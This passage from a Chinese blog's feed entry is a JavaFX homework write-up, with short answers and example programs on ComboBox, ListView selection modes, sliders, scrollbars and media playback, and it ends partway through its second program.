  </entry>
  <entry>
    <title>Java作业-8</title>
    <url>/2023/11/07/19-00-32/</url>
    <content><![CDATA[<p>JavaFX相关</p>
<span id="more"></span>
<h2 id="如何从一个组合框中获取一个条目如何从一个组合框中获取一个选中条目"><a class="markdownIt-Anchor" href="#如何从一个组合框中获取一个条目如何从一个组合框中获取一个选中条目"></a> 如何从一个组合框中获取一个条目？如何从一个组合框中获取一个选中条目？</h2>
<p><code>comboBox.getItems()</code><br>
<code>comboBox.getValue()</code></p>
<h2 id="当选择一个新的条目时combobox-将触发什么事件"><a class="markdownIt-Anchor" href="#当选择一个新的条目时combobox-将触发什么事件"></a> 当选择一个新的条目时，ComboBox 将触发什么事件？</h2>
<p><code>ActionEvent</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> comboBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
comboBox<span class="token punctuation">.</span><span class="token function">getItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token string">"选项1"</span><span class="token punctuation">,</span> <span class="token string">"选项2"</span><span class="token punctuation">,</span> <span class="token string">"选项3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 为ComboBox设置一个事件处理器，以响应用户的选择动作</span>
comboBox<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> selected <span class="token operator">=</span> comboBox<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户选择了: "</span> <span class="token operator">+</span> selected<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果只是想监听选择的变化，而不是用户的点击动作，使用ChangeListener而不是ActionEvent。ChangeListener会在每次选中的条目发生变化时触发，而不仅仅是用户交互时。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 为ComboBox的选择模型添加一个变化监听器</span>
comboBox<span class="token punctuation">.</span><span class="token function">getSelectionModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">selectedItemProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span>observable<span class="token punctuation">,</span> oldValue<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"选中的条目从 "</span> <span class="token operator">+</span> oldValue <span class="token operator">+</span> <span class="token string">" 变更为 "</span> <span class="token operator">+</span> newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果需要在用户确认选择后进行操作，通常使用<code>ActionEvent</code>。如果需要跟踪选择的任何变化，无论是由用户操作还是程序逻辑引起的，应该使用<code>ChangeListener</code>。</p>
<h2 id="如何创建一个具有一个字符串数组的可观察的列表"><a class="markdownIt-Anchor" href="#如何创建一个具有一个字符串数组的可观察的列表"></a> 如何创建一个具有一个字符串数组的可观察的列表？</h2>
<p><code>FXCollections.observableArrayList(arrayOfStrings);</code></p>
<h2 id="列表视图有什么可用的选择模式什么是默认的选择模式如何设置一个选择模式"><a class="markdownIt-Anchor" href="#列表视图有什么可用的选择模式什么是默认的选择模式如何设置一个选择模式"></a> 列表视图有什么可用的选择模式？什么是默认的选择模式？如何设置一个选择模式？</h2>
<ul>
<li><code>SelectionMode.SINGLE</code>：单选模式，用户一次只能选择一个列表项。<br>
<code>SelectionMode.MULTIPLE</code>：多选模式，用户可以选择多个列表项。</li>
<li>默认的选择模式是<code>SelectionMode.SINGLE</code><br>
<code>listView.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);</code></li>
</ul>
<h2 id="如何创建一个水平滚动条如何创建一个垂直滚动条"><a class="markdownIt-Anchor" href="#如何创建一个水平滚动条如何创建一个垂直滚动条"></a> 如何创建一个水平滚动条？如何创建一个垂直滚动条？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">ScrollBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token function">setOrientation</span><span class="token punctuation">(</span><span class="token class-name">Orientation</span><span class="token punctuation">.</span><span class="token constant">HORIZONTAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setOrientation</span><span class="token punctuation">(</span><span class="token class-name">Orientation</span><span class="token punctuation">.</span><span class="token constant">VERTICAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="如何创建一个水平滑动条如何创建一个垂直滑动条"><a class="markdownIt-Anchor" href="#如何创建一个水平滑动条如何创建一个垂直滑动条"></a> 如何创建一个水平滑动条？如何创建一个垂直滑动条？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Slider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setOrientation</span><span class="token punctuation">(</span><span class="token class-name">Orientation</span><span class="token punctuation">.</span><span class="token constant">HORIZONTAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setOrientation</span><span class="token punctuation">(</span><span class="token class-name">Orientation</span><span class="token punctuation">.</span><span class="token constant">VERTICAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="如何添加一个监听器用于处理滑动条的属性值改变"><a class="markdownIt-Anchor" href="#如何添加一个监听器用于处理滑动条的属性值改变"></a> 如何添加一个监听器用于处理滑动条的属性值改变？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">horizontalSlider<span class="token punctuation">.</span><span class="token function">valueProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span>observable<span class="token punctuation">,</span> oldValue<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"滑动条的新值："</span> <span class="token operator">+</span> newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="如何从一个-url-创建一个-media对象-如何创建一个-mediaplayer-如何创建一个mediaview"><a class="markdownIt-Anchor" href="#如何从一个-url-创建一个-media对象-如何创建一个-mediaplayer-如何创建一个mediaview"></a> 如何从一个 URL 创建一个 Media对象？ 如何创建一个 MediaPlayer? 如何创建一个MediaView ?</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个Media对象</span>
<span class="token class-name">String</span> mediaUrl <span class="token operator">=</span> <span class="token string">"file.mp4"</span><span class="token punctuation">;</span>

<span class="token class-name">Media</span> media <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Media</span><span class="token punctuation">(</span>mediaUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 创建MediaPlayer</span>
<span class="token class-name">MediaPlayer</span> mediaPlayer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MediaPlayer</span><span class="token punctuation">(</span>media<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 创建MediaView</span>
<span class="token class-name">MediaView</span> mediaView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MediaView</span><span class="token punctuation">(</span>mediaPlayer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 播放媒体</span>
mediaPlayer<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 停止媒体播放</span>
mediaPlayer<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 暂停媒体播放</span>
mediaPlayer<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="选择一种字体编写一个程序可以动态地改变堆栈面板上显示的标签中文本的字体-这个消息可以同时以粗体和斜体显示-可以从组合框中选择字体名和字体大小-使用-fontgetfamilies-可以得到可用的字体名-字体大小的组合框初始化为从1到100之间的数字"><a class="markdownIt-Anchor" href="#选择一种字体编写一个程序可以动态地改变堆栈面板上显示的标签中文本的字体-这个消息可以同时以粗体和斜体显示-可以从组合框中选择字体名和字体大小-使用-fontgetfamilies-可以得到可用的字体名-字体大小的组合框初始化为从1到100之间的数字"></a> (选择一种字体)编写一个程序，可以动态地改变堆栈面板上显示的标签中文本的字体。这个消息可以同时以粗体和斜体显示。可以从组合框中选择字体名和字体大小。使用 Font.getFamilies() 可以得到可用的字体名。字体大小的组合框初始化为从1到100之间的数字</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token comment">//使用组合框设置文字类型</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">ComboBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Font</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DynamicFontChanger</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span>
<span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">Text</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//字体类型组合框</span>
        <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> cboFont <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cboFont<span class="token punctuation">.</span><span class="token function">setPrefWidth</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">Font</span><span class="token punctuation">.</span><span class="token function">getFamilies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> size <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cboFont<span class="token punctuation">.</span><span class="token function">getItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cboFont<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//字体大小组合框</span>
        <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> cboSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cboSize<span class="token punctuation">.</span><span class="token function">setPrefWidth</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> textSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            textSize<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cboSize<span class="token punctuation">.</span><span class="token function">getItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>textSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cboSize<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//排版字体和大小组合框</span>
        <span class="token class-name">HBox</span> hbForControl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hbForControl<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hbForControl<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cboFont<span class="token punctuation">,</span> cboSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//实现组合框功能</span>
        cboFont<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            text<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span><span class="token class-name">Font</span><span class="token punctuation">.</span><span class="token function">font</span><span class="token punctuation">(</span>cboFont<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cboSize<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        cboSize<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            text<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span><span class="token class-name">Font</span><span class="token punctuation">.</span><span class="token function">font</span><span class="token punctuation">(</span>cboFont<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cboSize<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//排版</span>
        <span class="token class-name">BorderPane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setPrefSize</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setTop</span><span class="token punctuation">(</span>hbForControl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"ControlTextFontSize"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用combobox和listview编写一个程序演示在列表中选择的条目-程序用组合框指定选择方式-当选择条目后列表下方的标签中就会显示选定项"><a class="markdownIt-Anchor" href="#使用combobox和listview编写一个程序演示在列表中选择的条目-程序用组合框指定选择方式-当选择条目后列表下方的标签中就会显示选定项"></a> (使用ComboBox和ListView)编写一个程序，演示在列表中选择的条目。程序用组合框指定选择方式。当选择条目后，列表下方的标签中就会显示选定项</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token comment">//使用复选框设置列表视图的可选模式</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">ComboBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">ObservableList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">FXCollections</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">ListView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">SelectionMode</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Label</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span>  <span class="token keyword">class</span> <span class="token class-name">ComboBoxAndListView</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span>
<span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//控制视图列表的显示模式的组合框</span>
        <span class="token class-name">Label</span><span class="token punctuation">[</span><span class="token punctuation">]</span> modes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"SINGLE"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"MULTIPLE"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">ObservableList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Label</span><span class="token punctuation">&gt;</span></span> items <span class="token operator">=</span> <span class="token class-name">FXCollections</span><span class="token punctuation">.</span><span class="token function">observableArrayList</span><span class="token punctuation">(</span>modes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Label</span><span class="token punctuation">&gt;</span></span> cbMode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComboBox</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cbMode<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>modes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cbMode<span class="token punctuation">.</span><span class="token function">getItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//视图列表内容</span>
        <span class="token class-name">Label</span><span class="token punctuation">[</span><span class="token punctuation">]</span> country <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
            <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">ObservableList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Label</span><span class="token punctuation">&gt;</span></span> itemsCountry <span class="token operator">=</span> <span class="token class-name">FXCollections</span><span class="token punctuation">.</span><span class="token function">observableArrayList</span><span class="token punctuation">(</span>country<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ListView</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Label</span><span class="token punctuation">&gt;</span></span> lvCountry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListView</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lvCountry<span class="token punctuation">.</span><span class="token function">getItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>itemsCountry<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//排版控制部分</span>
